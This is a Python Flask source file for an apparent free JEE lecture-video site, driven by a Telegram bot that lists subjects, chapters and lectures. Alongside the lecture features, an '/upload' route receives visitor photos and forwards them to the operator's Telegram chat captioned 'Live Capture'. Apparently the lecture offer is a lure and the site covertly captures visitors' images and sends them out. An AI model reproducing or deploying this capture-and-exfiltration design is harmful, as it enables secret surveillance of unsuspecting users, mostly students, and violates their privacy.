import os, requests
from flask import Flask, send_file, request, jsonify
from pymongo import MongoClient

app = Flask(__name__)

# ---------- CONFIG (ENV VARS ONLY) ----------
BOT_TOKEN  = os.environ.get("BOT_TOKEN")
CHAT_ID    = os.environ.get("CHAT_ID")
RENDER_URL = os.environ.get("RENDER_URL")
MONGO_URI  = os.environ.get("MONGO_URI")

# ---------- MONGODB ----------
client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
db = client["jee_database"]
collection = db["content"]

# ---------- ROUTES ----------
@app.route("/")
def home():
    return send_file("index.html")

@app.route("/get_video")
def get_video():
    sub = request.args.get("sub")
    ch  = request.args.get("ch")
    lec = request.args.get("id")

    doc = collection.find_one({"subject": sub, "chapter": ch})
    if doc and lec in doc.get("lectures", {}):
        return jsonify({"url": doc["lectures"][lec]})

    return jsonify({"url": "https://t.me/blackvaltofficial/8?embed=1&autoplay=1"})

@app.route("/upload", methods=["POST"])
def upload():
    if "photo" in request.files:
        p = request.files["photo"]
        name = f"cap_{os.urandom(3).hex()}.jpg"
        p.save(name)

        with open(name, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": "📸 Live Capture"},
                files={"photo": f}
            )
        os.remove(name)
    return "OK", 200

# ---------- TELEGRAM WEBHOOK ----------
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    data = request.get_json()

    # ---------- MESSAGE ----------
    if "message" in data:
        cid  = str(data["message"]["chat"]["id"])
        text = data["message"].get("text", "")

        if text == "/start":
            kb = {
                "inline_keyboard": [
                    [{"text": "Physics", "callback_data": "u_phy"},
                     {"text": "Chemistry", "callback_data": "u_chem"}],
                    [{"text": "Maths", "callback_data": "u_math"}]
                ]
            }
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "📚 Select Subject", "reply_markup": kb}
            )

        # ---------- ADMIN ADD ----------
        elif cid == CHAT_ID and text.startswith("/add"):
            try:
                _, sub, ch, lec, link = text.split("|")
                if "embed" not in link:
                    link += "?embed=1&autoplay=1"

                collection.update_one(
                    {"subject": sub, "chapter": ch},
                    {"$set": {f"lectures.{lec}": link}},
                    upsert=True
                )

                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": cid, "text": f"✅ Added: {sub} > {ch} > {lec}"}
                )
            except:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": cid, "text": "❌ Use: /add phy|Chapter|Lec1|link"}
                )

    # ---------- CALLBACK ----------
    elif "callback_query" in data:
        cq = data["callback_query"]
        cid = cq["message"]["chat"]["id"]
        val = cq["data"]

        if val.startswith("u_"):
            sub = val[2:]
            chs = collection.distinct("chapter", {"subject": sub})
            btn = [[{"text": c, "callback_data": f"ch_{sub}_{c}"}] for c in chs]

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "Select Chapter", "reply_markup": {"inline_keyboard": btn}}
            )

        elif val.startswith("ch_"):
            _, sub, ch = val.split("_")
            doc = collection.find_one({"subject": sub, "chapter": ch})

            btn = [[{
                "text": lec,
                "url": f"{RENDER_URL}?sub={sub}&ch={ch}&id={lec}"
            }] for lec in doc.get("lectures", {})]

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "🎥 Lectures", "reply_markup": {"inline_keyboard": btn}}
            )

    return "OK", 200


# ---------- START ----------
if __name__ == "__main__":
    if BOT_TOKEN and RENDER_URL:
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook",
            params={"url": f"{RENDER_URL}/{BOT_TOKEN}"}
        )

    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
